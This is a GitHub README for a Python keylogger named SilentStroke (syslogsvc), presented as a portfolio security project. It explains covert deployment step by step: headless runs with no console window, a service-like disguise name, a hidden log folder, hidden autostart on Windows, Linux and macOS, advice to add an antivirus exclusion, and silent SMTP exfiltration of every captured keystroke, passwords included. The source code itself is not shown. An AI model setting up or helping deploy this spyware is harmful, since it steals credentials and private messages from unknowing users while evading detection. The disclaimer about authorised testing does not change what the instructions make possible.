# SilentStroke

![License](https://img.shields.io/badge/license-MIT-blue)
![Python](https://img.shields.io/badge/python-3.8%2B-blue)
![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20macOS-lightgrey)
![Status](https://img.shields.io/badge/status-active-brightgreen)

A single-file, dependency-light keystroke and foreground-window logger for Windows, Linux (X11), and macOS. It writes plaintext per-day logs to a service-style dot-directory and can silently mail each flushed chunk over SMTP, giving you attributable input capture with zero open ports and no admin rights.

---

## Table of Contents

1. [Project Overview](#1-project-overview)
2. [Key Features](#2-key-features)
3. [Prerequisites & Installation](#3-prerequisites--installation)
4. [Usage Guide](#4-usage-guide)
5. [Configuration & Customization](#5-configuration--customization)
6. [Architecture & Workflow](#6-architecture--workflow)
7. [Troubleshooting & Limitations](#7-troubleshooting--limitations)
8. [Contributing, Disclaimer & License](#8-contributing-disclaimer--license)

---

## 1. Project Overview

**syslogsvc** is a lightweight host-monitoring tool that records what is typed on a machine and which application received it, then rolls the record into per-day text files. It exists to answer one question cheaply: *what was typed, into what, and when* — without a kernel driver, a service install, a database, or an inbound listener.

### Target Audience

| Audience | Why it applies |
| --- | --- |
| **Security analysts / blue team** | Establish ground truth for endpoint activity during awareness exercises and tabletop drills. |
| **Penetration testers** | Drop-in host recon during an engagement; no compiler, no elevation, no persistence beyond a scheduled task. |
| **Sysadmins** | Audit activity on shared or kiosk machines you administer. |
| **Students / learners** | A readable reference implementation of `pynput`, threading, and safe file buffering — under 200 lines. |

### Design Goals

- **Small surface** — one script, one third-party dependency, stdlib for everything else.
- **No privileges** — userland only; nothing to uninstall, no registry writes, no service registration.
- **No inbound port** — logs leave the host by outbound SMTP, or not at all.
- **Attributable output** — every keystroke is bracketed by a foreground-window and timestamp context line.
- **Survivable** — buffered writes with per-day rollover so a long run doesn't corrupt one giant file.

---

## 2. Key Features

- **Keystroke capture** with human-readable tags for control keys, arrows, function keys, and modifiers — `[TAB]`, `[BKSP]`, `[CTRL-C]`, `[F5]`, `[SHIFT]`, `[WIN]`.
- **Foreground-window context** stamped on every focus change, so input is attributable to an application rather than floating free.
- **Per-day log files** with automatic midnight rollover.
- **Optional SMTP exfiltration** — each flush is a standalone message with hostname and timestamp in the subject. Off by one constant.
- **Headless execution** — runs under `pythonw` / `--noconsole` with no console window and no taskbar entry.
- **Cross-platform** from one source tree: Windows, Linux (X11), macOS.
- **Graceful shutdown** via `Ctrl+C` or the global hotkey `Ctrl+Alt+Q`, with a final buffer flush before exit.
- **Zero-config paths** — log directory resolves per-OS automatically.
- **Buffered I/O** — nothing hits disk per keystroke, keeping the write pattern low-noise and SSD-friendly.

---

## 3. Prerequisites & Installation

### System Requirements

| Component | Requirement |
| --- | --- |
| **OS** | Windows 10/11 · Linux with an **X11** session · macOS 11+ |
| **Python** | 3.8 or newer |
| **Linux extras** | `xdotool` on `PATH`; Wayland is **not** supported |
| **macOS extras** | Accessibility permission for the host terminal/binary |
| **Windows extras** | None |
| **Privileges** | None — no Administrator, no `sudo` |

> **Linux note:** both `pynput` and `xdotool` are X11-bound. Under Wayland the listener attaches but captures nothing. Log out and pick an "Xorg" / "X11" session at the display manager.

> **macOS note:** *System Settings → Privacy & Security → Accessibility* must list your terminal (or the Python binary). Without it the listener starts, reports no error, and records nothing.

### Clone the Repository

```bash
git clone https://github.com/Mohitgingale/Cybersec-Projects.git
cd Cybersec-Projects/KEYLOGGER
```

### Dependencies

```bash
pip install -r requirements.txt
```

Contents of `requirements.txt`:
```
pynput>=1.7.6,<2.0
```

Linux only, one system package:
```bash
sudo apt install xdotool        # Debian / Ubuntu
sudo dnf install xdotool        # Fedora
sudo pacman -S xdotool          # Arch
```

### Standalone Executable (Optional)

Build a self-contained binary if the target has no Python:

```bash
pip install -r requirements-dev.txt
pyinstaller --onefile --noconsole --name syslogsvc keylog.py
```

Output: `dist/syslogsvc.exe` (Windows) or `dist/syslogsvc` (Linux/macOS). `--noconsole` is mandatory on Windows, otherwise a terminal window sits visible for the whole run.

*Note: The binary is 8–15 MB, appears in the process list under its own name, and is more likely to trip heuristic AV than `pythonw keylog.py`. You may need to add a temporary exclusion to your Antivirus during compilation.*

---

## 4. Usage Guide

### Invocation

The tool takes **no command-line arguments** — all behavior is set by constants at the top of `keylog.py` (see [§5](#5-configuration--customization)). Start it:

```bash
# Windows — no console window
pythonw keylog.py

# Linux / macOS
python3 keylog.py
```

### Stopping

| Method | Effect |
| --- | --- |
| `Ctrl+Alt+Q` | Global hotkey; flushes buffer, exits cleanly. |
| `Ctrl+C` | Terminal interrupt; flushes buffer, exits cleanly. |
| Task Manager / `kill` | No final flush — up to `FLUSH_EVERY` seconds of input is lost. |

### Verifying It Works

1. Launch the logger.
2. Type a few characters into two different applications, switching windows between them.
3. Wait one `FLUSH_EVERY` interval.
4. Open today's log file and confirm **both** window-separator lines and your keystrokes are present.
5. If `SEND_EMAIL` is enabled, confirm the message landed.

If steps 4–5 produce nothing, go to [§7](#7-troubleshooting--limitations) before assuming a code fault.



### Log Location

| Platform | Path |
| --- | --- |
| Windows | `%LOCALAPPDATA%\.syslogsvc\log_YYYY-MM-DD.txt` |
| Linux / macOS | `~/.syslogsvc/log_YYYY-MM-DD.txt` |

On Windows the directory is **not** hidden by default. You can hide it via:
```bat
attrib +h "%LOCALAPPDATA%\.syslogsvc"
```

### Sample Output

```
# session 2026-11-13 09:14:02 DESKTOP-7QK2F1 Windows

===== [2026-11-13 09:14:07] Inbox - you@gmail.com - Gmail - Google Chrome =====
hello there[TAB]this is a test[ENTER]
===== [2026-11-13 09:14:31] notes.txt - Notepad =====
[CTRL-V]
```

### Autostart

**Windows — Startup folder**
1. `Win+R` → `shell:startup`
2. Create a shortcut targeting `pythonw.exe "C:\path\to\keylog.py"`

**Windows — Task Scheduler (survives reboot, hidden)**
Task → trigger *At log on* → action *Start a program* → `pythonw.exe`, script path as argument → enable *Run whether user is logged on or not* and *Hidden*.

**Linux — `~/.config/autostart/syslogsvc.desktop`**
```ini
[Desktop Entry]
Type=Application
Name=syslogsvc
Exec=python3 /home/user/syslogsvc/keylog.py
X-GNOME-Autostart-enabled=true
```

**macOS — `~/Library/LaunchAgents/com.user.syslogsvc.plist`**
Set `ProgramArguments` to `python3` plus the script path, then:
```bash
launchctl load ~/Library/LaunchAgents/com.user.syslogsvc.plist
```

---

## 5. Configuration & Customization

### Configuration Method

There is no config file and no environment-variable layer — settings are module-level constants in `keylog.py`, read once at import. Edit, save, restart. This is deliberate: one file to read means one file to audit.

### Constants

| Constant | Default | Meaning |
| --- | --- | --- |
| `SEND_EMAIL` | `True` | Master switch for SMTP. `False` = local-only. |
| `SMTP_HOST` | `smtp.gmail.com` | SMTP server. |
| `SMTP_PORT` | `587` | STARTTLS port. |
| `SMTP_USER` | `YourMail@gmail.com` | Auth account, also the `From` address. |
| `SMTP_PASS` | *(app password)* | Gmail requires an App Password, not the login password. |
| `MAIL_TO` | `ReceiverMail@gmail.com` | Destination address. |
| `FLUSH_EVERY` | `15` | Seconds between flushes. |
| `POLL_WINDOW` | `0.75` | Seconds between foreground-window polls. |

### Gmail App Password

1. Enable 2-Step Verification on the account.
2. *Google Account → Security → App passwords* → generate for "Mail".
3. Paste the 16-character value into `SMTP_PASS` — the spaces Google displays are accepted verbatim.
4. Use a dedicated account, not your primary mailbox.

Any STARTTLS-capable provider works; change `SMTP_HOST`/`SMTP_PORT` for others. Gmail's free tier caps outbound mail around 500/day, which the defaults exceed over a long run — see tuning.

### Tuning

| Goal | Change |
| --- | --- |
| Fewer emails | `FLUSH_EVERY = 120` to `300` (from 4/min to 1 per 2–5 min) |
| Finer window context | Lower `POLL_WINDOW` (CPU cost scales inversely) |
| Silent, local-only | `SEND_EMAIL = False` |
| Different log root | Edit the `BASE = ...` assignment |
| Add key tags | Extend the `SPECIAL` and `CTRL_MAP` dicts |

---

## 6. Architecture & Workflow

### How It Works

```text
 key event ──► on_press ──► tag/char ─┐
                                      ├──► self.buf (list, lock-guarded)
 foreground poll ──► on change ───────┘
                                              │
                              every FLUSH_EVERY│
                                              ▼
                        join buffer ──► append to log_YYYY-MM-DD.txt
                                              │
                                        if SEND_EMAIL
                                              ▼
                                daemon thread ──► SMTP (STARTTLS)
```

Three threads share one `Logger`:

| Thread | Role |
| --- | --- |
| `keyboard.Listener` | Translates key events into characters or bracket tags, appends to the buffer. |
| `window_loop` | Polls the foreground window on `POLL_WINDOW`; on change, pushes a timestamped separator. |
| `flush_loop` | Every `FLUSH_EVERY`, drains the buffer under lock, writes to disk, optionally mails. |

**Write path.** `push()` appends under `threading.Lock`; `flush()` swaps the buffer out under the same lock, so a flush can never interleave with a keystroke and lose data. The buffer is drained into a local `chunk` before any I/O, so the lock is held for microseconds.

**Rollover.** `flush()` compares `date.today()` to `self.day` and repoints `self.path` at the new day's file, so a run spanning midnight splits cleanly instead of appending to yesterday.

**Exfiltration.** `mail()` spawns a daemon thread per chunk so a slow or dead SMTP server never blocks capture. Failures are swallowed — disk writes have already succeeded by then, so exfil is lossy by design and disk is authoritative.

**Shutdown.** The hotkey handler sets a `threading.Event`; both loops poll it via `Event.wait(timeout)`, so stopping is immediate rather than waiting out an interval. `finally` forces a last flush.

### Directory Structure

```text
KEYLOGGER/
├── keylog.py              # entire tool: config, Logger, listener, main()
├── requirements.txt       # pynput (runtime)
├── requirements-dev.txt   # pyinstaller (build only)
├── README.md              # this document
├── LICENSE                # MIT
└── docs/
    └── screenshot-*.png   # usage evidence

~/.syslogsvc/              # created at runtime, outside the repo
└── log_YYYY-MM-DD.txt
```

---

## 7. Troubleshooting & Limitations

### Common Errors

| Symptom | Cause | Fix |
| --- | --- | --- |
| No keystrokes, no error, no log file | macOS Accessibility permission not granted | Add the terminal/binary under *Privacy & Security → Accessibility*, restart it |
| No keystrokes on Linux | Wayland session | Log out, choose an Xorg session |
| Window titles blank, keystrokes fine | `xdotool` missing or off `PATH` | `sudo apt install xdotool` |
| Logs write, no mail arrives | Wrong/revoked App Password, 2FA disabled, or port 587 blocked | Regenerate the app password; test 587 egress; check spam |
| `ImportError: pynput` | Dependency missing | `pip install -r requirements.txt` |
| `AttributeError: Key...` at launch | `pynput` version mismatch | Pin to `>=1.7.6,<2.0` |
| Console window won't close | Started with `python` instead of `pythonw` | Use `pythonw` or the `--noconsole` build |

Mail failures are silent by design — the `except Exception: pass` in `_send()` makes a bad credential look identical to success. When diagnosing, check the log file first to confirm capture works, then isolate SMTP with a manual `swaks`/`telnet` test.

### Known Limitations

- **Wayland unsupported** — X11 only.
- **Titles only** — no process name, PID, or URL, so two windows of the same app are indistinguishable.
- **Memory-only buffer** — an unclean kill loses up to `FLUSH_EVERY` seconds.
- **Plaintext credentials** — `SMTP_PASS` sits in the source file.
- **Plaintext logs** — captured passwords and message contents are unencrypted on disk and in transit to the mail provider.
- **No rotation or size cap** — old files are deleted by hand.
- **No CLI flags, no daemon mode, no self-install.**
- **Auto-repeat noise** — modifier tags repeat while held.
- **No clipboard capture** — keystrokes only; `Ctrl+V` logs as `[CTRL-V]`, not the pasted text.
- **No Unicode edge-case handling** — dead keys and IME composition log as the raw character `pynput` reports.

---

## 8. Contributing, Disclaimer & License

### How to Contribute

1. Fork the repository.
2. Branch: `git checkout -b feature/window-fallback`
3. Commit with a scoped message: `git commit -m "feat: fall back to process name when title is empty"`
4. Push: `git push origin feature/window-fallback`
5. Open a pull request describing the change and how it was tested.

Conventions: one logical change per PR, no new dependencies without justification, and update this README alongside behavior changes. Issues should include OS, Python version, and the log tail.

### Disclaimer

This tool is created for **educational purposes and ethical hacking/security testing only**. A keylogger records every keystroke and window title on the host machine, which makes it useful for security awareness, forensic exercises, monitoring your own devices, and demonstrating how much a compromised machine leaks. Because the logs are plaintext and the SMTP password sits in the source file, treat any captured data as sensitive. Do not use this tool on systems you do not own or do not have explicit permission to test — and on a work or client machine, disclose it or check the monitoring policy first. The author is not responsible for any misuse, data loss, or damage caused by this program.

### License

MIT — see [`LICENSE`](../LICENSE). Reuse permitted with attribution intact.

Part of the [Cybersec-Projects](https://github.com/Mohitgingale/Cybersec-Projects) portfolio. If you fork, patch, or redistribute this tool, keep this notice and the MIT attribution intact.
